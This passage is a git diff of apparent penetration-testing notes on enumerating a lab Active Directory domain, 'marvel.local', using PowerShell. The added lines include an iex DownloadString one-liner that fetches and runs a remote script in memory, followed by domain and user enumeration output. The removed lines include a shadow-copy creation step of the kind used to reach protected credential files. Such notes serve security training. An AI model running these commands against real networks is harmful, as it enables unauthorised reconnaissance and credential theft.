@@ -358,907 +358,198 @@ References:
 https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
 ```
 
-# Information Gathering WMIC
+# Information Gathering 
+
+Domain Enumeration using AD Module
+```
+PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+Get domain Info
 
 ```
-PS C:\Users\pparker> Get-WmiObject  -Class Win32_IP4RouteTable
+PS C:\Users\pparker> Get-ADDomain                                                                                       
 
+DomainSID                          : S-1-5-21-1806573636-3987246654-2051155295
+AllowedDNSSuffixes                 : {}
+LastLogonReplicationInterval       :
+DomainMode                         : Windows2016Domain
+ManagedBy                          :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=marvel,DC=loca
+                                     l}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=marvel,DC=local
+DomainControllersContainer         : OU=Domain Controllers,DC=marvel,DC=local
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=marvel,DC=local
+Forest                             : marvel.local
+InfrastructureMaster               : HYDRA.marvel.local
+NetBIOSName                        : MARVEL
+PDCEmulator                        : HYDRA.marvel.local
+ParentDomain                       :
+RIDMaster                          : HYDRA.marvel.local
+SystemsContainer                   : CN=System,DC=marvel,DC=local
+UsersContainer                     : CN=Users,DC=marvel,DC=local
+SubordinateReferences              : {DC=ForestDnsZones,DC=marvel,DC=local, DC=DomainDnsZones,DC=marvel,DC=local,
+                                     CN=Configuration,DC=marvel,DC=local}
+DNSRoot                            : marvel.local
+LostAndFoundContainer              : CN=LostAndFound,DC=marvel,DC=local
+DeletedObjectsContainer            : CN=Deleted Objects,DC=marvel,DC=local
+QuotasContainer                    : CN=NTDS Quotas,DC=marvel,DC=local
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {HYDRA.marvel.local}
+DistinguishedName                  : DC=marvel,DC=local
+Name                               : marvel
+ObjectClass                        : domainDNS
+ObjectGuid                         : b3abf270-8d31-424f-8933-b5a18c1f5207
+PropertyNames                      : {AllowedDNSSuffixes, ChildDomains, ComputersContainer, DeletedObjectsContainer...}
+AddedProperties                    : {}
+RemovedProperties                  : {}
+ModifiedProperties                 : {PublicKeyRequiredPasswordRolling}
+PropertyCount                      : 30
 
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="0.0.0.0",NextHop="192.1
-                   68.22.2"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="
-                   0.0.0.0",NextHop="192.168.22.2"
-Age              : 14838
-Caption          : 0.0.0.0
-Description      : 0.0.0.0 - 0.0.0.0 - 192.168.22.2
-Destination      : 0.0.0.0
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 0.0.0.0
-Metric1          : 25
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 0.0.0.0
-NextHop          : 192.168.22.2
-Protocol         : 3
-Status           :
-Type             : 4
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask="255.0.0.0",NextHop="0.
-                   0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask=
-                   "255.0.0.0",NextHop="0.0.0.0"
-Age              : 14844
-Caption          : 127.0.0.0
-Description      : 127.0.0.0 - 255.0.0.0 - 0.0.0.0
-Destination      : 127.0.0.0
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 1
-Mask             : 255.0.0.0
-Metric1          : 331
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 127.0.0.0
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask="255.255.255.255",NextH
-                   op="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask=
-                   "255.255.255.255",NextHop="0.0.0.0"
-Age              : 14844
-Caption          : 127.0.0.1
-Description      : 127.0.0.1 - 255.255.255.255 - 0.0.0.0
-Destination      : 127.0.0.1
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 1
-Mask             : 255.255.255.255
-Metric1          : 331
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 127.0.0.1
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
-                   ,NextHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1
-                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
-Age              : 14844
-Caption          : 127.255.255.255
-Description      : 127.255.255.255 - 255.255.255.255 - 0.0.0.0
-Destination      : 127.255.255.255
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 1
-Mask             : 255.255.255.255
-Metric1          : 331
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 127.255.255.255
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,Mask="255.255.255.0",Nex
-                   tHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,M
-                   ask="255.255.255.0",NextHop="0.0.0.0"
-Age              : 79
-Caption          : 192.168.22.0
-Description      : 192.168.22.0 - 255.255.255.0 - 0.0.0.0
-Destination      : 192.168.22.0
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 255.255.255.0
-Metric1          : 281
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 192.168.22.0
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13,Mask="255.255.255.255"
-                   ,NextHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13
-                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
-Age              : 79
-Caption          : 192.168.22.212
-Description      : 192.168.22.212 - 255.255.255.255 - 0.0.0.0
-Destination      : 192.168.22.212
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 255.255.255.255
-Metric1          : 281
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 192.168.22.212
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13,Mask="255.255.255.255"
-                   ,NextHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13
-                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
-Age              : 79
-Caption          : 192.168.22.255
-Description      : 192.168.22.255 - 255.255.255.255 - 0.0.0.0
-Destination      : 192.168.22.255
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 255.255.255.255
-Metric1          : 281
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 192.168.22.255
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask="240.0.0.0",NextHop="0.
-                   0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask=
-                   "240.0.0.0",NextHop="0.0.0.0"
-Age              : 14844
-Caption          : 224.0.0.0
-Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
-Destination      : 224.0.0.0
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 1
-Mask             : 240.0.0.0
-Metric1          : 331
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 224.0.0.0
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask="240.0.0.0",NextHop="0
-                   .0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask
-                   ="240.0.0.0",NextHop="0.0.0.0"
-Age              : 14842
-Caption          : 224.0.0.0
-Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
-Destination      : 224.0.0.0
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 240.0.0.0
-Metric1          : 281
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 224.0.0.0
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
-                   ,NextHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
-                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
-Age              : 14844
-Caption          : 255.255.255.255
-Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
-Destination      : 255.255.255.255
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 1
-Mask             : 255.255.255.255
-Metric1          : 331
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 255.255.255.255
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
-
-__GENUS          : 2
-__CLASS          : Win32_IP4RouteTable
-__SUPERCLASS     : CIM_LogicalElement
-__DYNASTY        : CIM_ManagedSystemElement
-__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=13,Mask="255.255.255.255
-                   ",NextHop="0.0.0.0"
-__PROPERTY_COUNT : 18
-__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
-__SERVER         : SPIDERMAN
-__NAMESPACE      : root\cimv2
-__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
-                   3,Mask="255.255.255.255",NextHop="0.0.0.0"
-Age              : 14842
-Caption          : 255.255.255.255
-Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
-Destination      : 255.255.255.255
-Information      : 0.0
-InstallDate      :
-InterfaceIndex   : 13
-Mask             : 255.255.255.255
-Metric1          : 281
-Metric2          : -1
-Metric3          : -1
-Metric4          : -1
-Metric5          : -1
-Name             : 255.255.255.255
-NextHop          : 0.0.0.0
-Protocol         : 2
-Status           :
-Type             : 3
-PSComputerName   : SPIDERMAN
 ```
 
+Get Domain users 
 
-Enumerate user in Domain and Trusted domain
 ```
-PS C:\Users\pparker> Get-WmiObject -Class  Win32_USerAccount
+PS C:\Users\pparker> Get-ADUser -Filter * -Properties *                                                                 
 
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : Administrator
+SID                : S-1-5-21-1806573636-3987246654-2051155295-500
+DistinguishedName  : CN=Administrator,CN=Users,DC=marvel,DC=local
+Name               : Administrator
+ObjectClass        : user
+ObjectGuid         : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 107
 
-AccountType : 512
-Caption     : SPIDERMAN\Administrator
-Domain      : SPIDERMAN
-SID         : S-1-5-21-1600661046-3385568014-3685991882-500
-FullName    :
-Name        : Administrator
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : False
+SamAccountName     : Guest
+SID                : S-1-5-21-1806573636-3987246654-2051155295-501
+DistinguishedName  : CN=Guest,CN=Users,DC=marvel,DC=local
+Name               : Guest
+ObjectClass        : user
+ObjectGuid         : 146f722a-23ea-4af7-a005-42463542788d
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 105
 
-AccountType : 512
-Caption     : SPIDERMAN\DefaultAccount
-Domain      : SPIDERMAN
-SID         : S-1-5-21-1600661046-3385568014-3685991882-503
-FullName    :
-Name        : DefaultAccount
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : False
+SamAccountName     : DefaultAccount
+SID                : S-1-5-21-1806573636-3987246654-2051155295-503
+DistinguishedName  : CN=DefaultAccount,CN=Users,DC=marvel,DC=local
+Name               : DefaultAccount
+ObjectClass        : user
+ObjectGuid         : 4d43f4cc-f470-4b9b-9a94-42c5d6773c54
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 105
 
-AccountType : 512
-Caption     : SPIDERMAN\Guest
-Domain      : SPIDERMAN
-SID         : S-1-5-21-1600661046-3385568014-3685991882-501
-FullName    :
-Name        : Guest
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : False
+SamAccountName     : krbtgt
+SID                : S-1-5-21-1806573636-3987246654-2051155295-502
+DistinguishedName  : CN=krbtgt,CN=Users,DC=marvel,DC=local
+Name               : krbtgt
+ObjectClass        : user
+ObjectGuid         : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 109
 
-AccountType : 512
-Caption     : SPIDERMAN\Peter
-Domain      : SPIDERMAN
-SID         : S-1-5-21-1600661046-3385568014-3685991882-1001
-FullName    :
-Name        : Peter
+GivenName          : Frank
+Surname            : Castle
+UserPrincipalName  : fcastle@marvel.local
+Enabled            : True
+SamAccountName     : fcastle
+SID                : S-1-5-21-1806573636-3987246654-2051155295-1103
+DistinguishedName  : CN=Frank Castle,CN=Users,DC=marvel,DC=local
+Name               : Frank Castle
+ObjectClass        : user
+ObjectGuid         : b492bfca-6c18-460e-9699-eb55b1c6e81a
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 106
 
-AccountType : 512
-Caption     : SPIDERMAN\WDAGUtilityAccount
-Domain      : SPIDERMAN
-SID         : S-1-5-21-1600661046-3385568014-3685991882-504
-FullName    :
-Name        : WDAGUtilityAccount
+GivenName          : Peter
+Surname            : Parker
+UserPrincipalName  : pparker@marvel.local
+Enabled            : True
+SamAccountName     : pparker
+SID                : S-1-5-21-1806573636-3987246654-2051155295-1105
+DistinguishedName  : CN=Peter Parker,CN=Users,DC=marvel,DC=local
+Name               : Peter Parker
+ObjectClass        : user
+ObjectGuid         : afdaab86-9be3-4a3c-a87c-71f4db56894a
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 106
 
-AccountType : 512
-Caption     : MARVEL\Administrator
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-500
-FullName    :
-Name        : Administrator
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : spn1
+SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
+DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
+Name               : spn1
+ObjectClass        : user
+ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
+PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 107
 
-AccountType : 512
-Caption     : MARVEL\Guest
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-501
-FullName    :
-Name        : Guest
-
-AccountType : 512
-Caption     : MARVEL\krbtgt
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-502
-FullName    :
-Name        : krbtgt
-
-AccountType : 512
-Caption     : MARVEL\DefaultAccount
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-503
-FullName    :
-Name        : DefaultAccount
-
-AccountType : 512
-Caption     : MARVEL\fcastle
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-1103
-FullName    : Frank Castle
-Name        : fcastle
-
-AccountType : 512
-Caption     : MARVEL\pparker
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-1105
-FullName    : Peter Parker
-Name        : pparker
-
-AccountType : 512
-Caption     : MARVEL\spn1
-Domain      : MARVEL
-SID         : S-1-5-21-1806573636-3987246654-2051155295-1109
-FullName    :
-Name        : spn1
 
 ```
 
 
-Enumerate groups in Domain and Trusted Domains
-```
-PS C:\Users\pparker> Get-WmiObject -Class Win32_Group
-Caption                                        Domain    Name                                    SID
--------                                        ------    ----                                    ---
-SPIDERMAN\Access Control Assistance Operators  SPIDERMAN Access Control Assistance Operators     S-1-5-32-579
-SPIDERMAN\Administrators                       SPIDERMAN Administrators                          S-1-5-32-544
-SPIDERMAN\Backup Operators                     SPIDERMAN Backup Operators                        S-1-5-32-551
-SPIDERMAN\Cryptographic Operators              SPIDERMAN Cryptographic Operators                 S-1-5-32-569
-SPIDERMAN\Device Owners                        SPIDERMAN Device Owners                           S-1-5-32-583
-SPIDERMAN\Distributed COM Users                SPIDERMAN Distributed COM Users                   S-1-5-32-562
-SPIDERMAN\Event Log Readers                    SPIDERMAN Event Log Readers                       S-1-5-32-573
-SPIDERMAN\Guests                               SPIDERMAN Guests                                  S-1-5-32-546
-SPIDERMAN\Hyper-V Administrators               SPIDERMAN Hyper-V Administrators                  S-1-5-32-578
-SPIDERMAN\IIS_IUSRS                            SPIDERMAN IIS_IUSRS                               S-1-5-32-568
-SPIDERMAN\Network Configuration Operators      SPIDERMAN Network Configuration Operators         S-1-5-32-556
-SPIDERMAN\Performance Log Users                SPIDERMAN Performance Log Users                   S-1-5-32-559
-SPIDERMAN\Performance Monitor Users            SPIDERMAN Performance Monitor Users               S-1-5-32-558
-SPIDERMAN\Power Users                          SPIDERMAN Power Users                             S-1-5-32-547
-SPIDERMAN\Remote Desktop Users                 SPIDERMAN Remote Desktop Users                    S-1-5-32-555
-SPIDERMAN\Remote Management Users              SPIDERMAN Remote Management Users                 S-1-5-32-580
-SPIDERMAN\Replicator                           SPIDERMAN Replicator                              S-1-5-32-552
-SPIDERMAN\System Managed Accounts Group        SPIDERMAN System Managed Accounts Group           S-1-5-32-581
-SPIDERMAN\Users                                SPIDERMAN Users                                   S-1-5-32-545
-MARVEL\Cert Publishers                         MARVEL    Cert Publishers                         S-1-5-21-1...
-MARVEL\RAS and IAS Servers                     MARVEL    RAS and IAS Servers                     S-1-5-21-1...
-MARVEL\Allowed RODC Password Replication Group MARVEL    Allowed RODC Password Replication Group S-1-5-21-1...
-MARVEL\Denied RODC Password Replication Group  MARVEL    Denied RODC Password Replication Group  S-1-5-21-1...
-MARVEL\DnsAdmins                               MARVEL    DnsAdmins                               S-1-5-21-1...
-MARVEL\Cloneable Domain Controllers            MARVEL    Cloneable Domain Controllers            S-1-5-21-1...
-MARVEL\DnsUpdateProxy                          MARVEL    DnsUpdateProxy                          S-1-5-21-1...
-MARVEL\Domain Admins                           MARVEL    Domain Admins                           S-1-5-21-1...
-MARVEL\Domain Computers                        MARVEL    Domain Computers                        S-1-5-21-1...
-MARVEL\Domain Controllers                      MARVEL    Domain Controllers                      S-1-5-21-1...
-MARVEL\Domain Guests                           MARVEL    Domain Guests                           S-1-5-21-1...
-MARVEL\Domain Users                            MARVEL    Domain Users                            S-1-5-21-1...
-MARVEL\Enterprise Admins                       MARVEL    Enterprise Admins                       S-1-5-21-1...
-MARVEL\Enterprise Key Admins                   MARVEL    Enterprise Key Admins                   S-1-5-21-1...
-MARVEL\Enterprise Read-only Domain Controllers MARVEL    Enterprise Read-only Domain Controllers S-1-5-21-1...
-MARVEL\Group Policy Creator Owners             MARVEL    Group Policy Creator Owners             S-1-5-21-1...
-MARVEL\Key Admins                              MARVEL    Key Admins                              S-1-5-21-1...
-MARVEL\Protected Users                         MARVEL    Protected Users                         S-1-5-21-1...
-MARVEL\Read-only Domain Controllers            MARVEL    Read-only Domain Controllers            S-1-5-21-1...
-MARVEL\Schema Admins                           MARVEL    Schema Admins                           S-1-5-21-1...
+Get Domain user info 
 ```
 
-```
-PS C:\Windows\system32> (Get-WmiObject -Class Win32_Shadowcopy -list).create("C:\", "ClientAccessible")
+PS C:\Users\pparker> Get-ADUser -Identity spn1                                                                          
 
+GivenName          :
+Surname            :
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : spn1
+SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
+DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
+Name               : spn1
+ObjectClass        : user
+ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
+PropertyNames      : {DistinguishedName, Enabled, GivenName, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 10
 
-__GENUS          : 2
-__CLASS          : __PARAMETERS
-__SUPERCLASS     :
-__DYNASTY        : __PARAMETERS
-__RELPATH        :
-__PROPERTY_COUNT : 2
-__DERIVATION     : {}
-__SERVER         :
-__NAMESPACE      :
-__PATH           :
-ReturnValue      : 0
-ShadowID         : {637B9468-E33A-4F4E-8E30-7B374BC2E40B}
-PSComputerName   :
-
-
-
-PS C:\Windows\system32> $link = (Get-WmiObject -Class Win32_Shadowcopy).DeviceObject + "\"
-PS C:\Windows\system32> cmd /c mklink /d C:\shadowcopy "$link"
-symbolic link created for C:\shadowcopy <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
-PS C:\Windows\system32>
-
-```
-
-
-# Active Directory Enumeration with WMIC
-
-Current Domain Name
-```
-PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select -ExpandProperty ds_dc
-marvel
-PS C:\Users\pparker> Get-WmiObject -Class Win32_ComputerSystem |select -ExpandProperty Domain
-marvel.local
-````
-Current Domain Info
-```
-PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_domain
-
-
-__GENUS                                        : 2
-__CLASS                                        : ds_domaindns
-__SUPERCLASS                                   : ads_domaindns
-__DYNASTY                                      : DS_LDAP_Root_Class
-__RELPATH                                      : ds_domaindns.ADSIPath="LDAP://DC=marvel,DC=local"
-__PROPERTY_COUNT                               : 178
-__DERIVATION                                   : {ads_domaindns, ds_domain, ds_top, DS_LDAP_Root_Class}
-__SERVER                                       : SPIDERMAN
-__NAMESPACE                                    : root\directory\ldap
-__PATH                                         : \\SPIDERMAN\root\directory\ldap:ds_domaindns.ADSIPath="LDAP:/
-                                                 /DC=marvel,DC=local"
-ADSIPath                                       : LDAP://DC=marvel,DC=local
-DS_adminDescription                            :
-DS_adminDisplayName                            :
-DS_allowedAttributes                           :
-DS_allowedAttributesEffective                  :
-DS_allowedChildClasses                         :
-DS_allowedChildClassesEffective                :
-DS_auditingPolicy                              : System.Management.ManagementBaseObject
-DS_bridgeheadServerListBL                      :
-DS_builtinCreationTime                         :
-DS_builtinModifiedCount                        :
-DS_cACertificate                               :
-DS_canonicalName                               :
-DS_cn                                          :
-DS_controlAccessRights                         :
-DS_createTimeStamp                             :
-DS_creationTime                                : 132234719871591031
-DS_dc                                          : marvel
-DS_defaultLocalPolicyObject                    :
-DS_description                                 :
-DS_desktopProfile                              :
-DS_directReports                               :
-DS_displayName                                 :
-DS_displayNamePrintable                        :
-DS_distinguishedName                           : DC=marvel,DC=local
-DS_domainPolicyObject                          :
-DS_domainReplica                               :
-DS_dSASignature                                : System.Management.ManagementBaseObject
-DS_dSCorePropagationData                       : {16010101000000.000000-000}
-DS_eFSPolicy                                   :
-DS_extensionName                               :
-DS_flags                                       :
-DS_forceLogoff                                 : -9223372036854775808
-DS_fromEntry                                   :
-DS_frsComputerReferenceBL                      :
-DS_fRSMemberReferenceBL                        :
-DS_fSMORoleOwner                               : CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-Na
-                                                 me,CN=Sites,CN=Configuration,DC=marvel,DC=local
-DS_gPLink                                      : [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies
-                                                 ,CN=System,DC=marvel,DC=local;0]
-DS_gPOptions                                   :
-DS_instanceType                                : 5
-DS_isCriticalSystemObject                      : True
-DS_isDeleted                                   :
-DS_isPrivilegeHolder                           :
-DS_isRecycled                                  :
-DS_lastKnownParent                             :
-DS_lockoutDuration                             : -18000000000
-DS_lockOutObservationWindow                    : -18000000000
-DS_lockoutThreshold                            : 0
-DS_lSACreationTime                             :
-DS_lSAModifiedCount                            :
-DS_managedBy                                   :
-DS_managedObjects                              :
-DS_masteredBy                                  : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
